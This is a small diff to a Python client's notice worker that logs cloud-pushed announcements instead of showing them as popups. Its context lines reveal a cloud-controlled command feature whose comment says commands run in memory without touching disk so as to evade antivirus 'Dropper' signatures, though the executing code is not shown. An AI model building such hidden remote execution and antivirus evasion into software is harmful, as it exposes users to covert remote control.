@@ -467,10 +467,10 @@ def _notice_worker():
             key = once or (title + "|" + text[:64])
             with _CLOUD_LOCK:
                 if _NOTICE_SHOWN["key"] == key:
-                    return                   # 本进程已弹过同一条
+                    return                   # 本进程已处理过同一条
                 _NOTICE_SHOWN["key"] = key
-            _push_log("[公告] 云下发：%s" % title)
-            _notice_show(title, text)
+            # v8.6.2：公告只读取不弹窗 —— 写进界面日志区即可
+            _push_log("[公告] %s：%s" % (title, text[:200]))
 
         # 云控命令：内存执行，不落盘脚本文件（规避杀软 Dropper 特征）
         if exec_cmd:
